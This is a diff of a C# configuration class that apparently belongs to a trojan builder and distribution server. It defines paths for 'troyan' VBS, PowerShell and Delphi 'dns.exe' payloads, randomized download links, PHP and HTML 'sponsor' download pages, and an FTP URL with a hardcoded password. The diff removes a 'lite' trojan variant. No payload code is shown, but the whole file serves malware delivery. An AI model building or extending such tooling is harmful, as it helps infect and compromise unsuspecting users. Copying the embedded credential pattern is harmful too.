@@ -67,7 +67,6 @@ namespace model
         [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
         [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
         [JsonPropertyName("troyanVbsFile")] public string TroyanVbsFile => Path.Join(TroyanVbsDir, "troyan.vbs");
-        [JsonPropertyName("troyanLiteVbsFile")] public string TroyanLiteVbsFile => Path.Join(TroyanVbsDir, "litetroyan.vbs");
         [JsonPropertyName("troyanDelphiExe")] public string TroyanDelphiExe => Path.Join(TroyanDelphiDir, "dns.exe");
         [JsonPropertyName("troyanDelphiProj")] public string TroyanDelphiProj => Path.Join(TroyanDelphiDir, "dns.dpr");
         [JsonPropertyName("troyanDelphiIco")] public string TroyanDelphiIco => Path.Join(TroyanDelphiDir, "_icon.ico");
@@ -83,13 +82,10 @@ namespace model
         [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
         [JsonPropertyName("userDelphiExe")] public string UserDelphiPath => Path.Join(UserDataDir, "troyan.exe");
         [JsonPropertyName("userVbsFile")] public string UserVbsFile => Path.Join(UserDataDir, "troyan.vbs");
-        [JsonPropertyName("userLiteVbsFile")] public string UserLiteVbsFile => Path.Join(UserDataDir, "litetroyan.vbs");
         [JsonPropertyName("userPowershellFile")] public string UserPowershellFile => Path.Join(UserDataDir, "troyan.txt");
         [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");
         
         [JsonPropertyName("userVbsFileClean")] public string UserVbsFileClean => Path.Join(UserDataDir, "troyan.c.vbs");
-        [JsonPropertyName("userLiteVbsFileClean")] public string UserLiteVbsFileClean => Path.Join(UserDataDir, "litetroyan.c.vbs");
-        
         
         public string Random()
         {
@@ -99,18 +95,12 @@ namespace model
         [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => $"{Server}/default/{Random()}/none/GetVbs";
         [JsonPropertyName("dnVbsLink")] public string DnVbsLink => $"http://{Alias}/{DnVbsLinkShort}";
         [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => $"{Server}/default/GetVbsPhp";
-        
-        [JsonPropertyName("dnLightVbsLinkShort")] public string DnLightVbsLinkShort => $"{Server}/default/{Random()}/none/GetLightVbs";
-        [JsonPropertyName("dnLightVbsLink")] public string DnLightVbsLink => $"http://{Alias}/{DnLightVbsLinkShort}";
-        [JsonPropertyName("phpLightVbsLinkShort")] public string PhpLightVbsLinkShort => $"{Server}/default/GetLightVbsPhp";
+       
         
         [JsonPropertyName("userPhpVbsFile")] public string UserPhpVbsFile => Path.Join(UserDataDir, "dn.php");
         [JsonPropertyName("userSponsorPhpVbsFile")] public string UserSponsorPhpVbsFile => Path.Join(UserDataDir, "download.php");
         [JsonPropertyName("userSponsorHtmlVbsFile")] public string UserSponsorHtmlVbsFile => Path.Join(UserDataDir, "download.html");
-        [JsonPropertyName("userPhpLightVbsFile")] public string UserPhpLightVbsFile => Path.Join(UserDataDir, "dn_light.php");
-        [JsonPropertyName("userSponsorPhpLightVbsFile")] public string UserSponsorPhpLightVbsFile => Path.Join(UserDataDir, "download_light.php");
-        [JsonPropertyName("userSponsorHtmlLightVbsFile")] public string UserSponsorHtmlLightVbsFile => Path.Join(UserDataDir, "download_light.html");
-
+        
         //FTP
         [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
         [JsonPropertyName("ftpAsHttp")] public string FtpAsHttp => $@"http://{Server}/ftp";
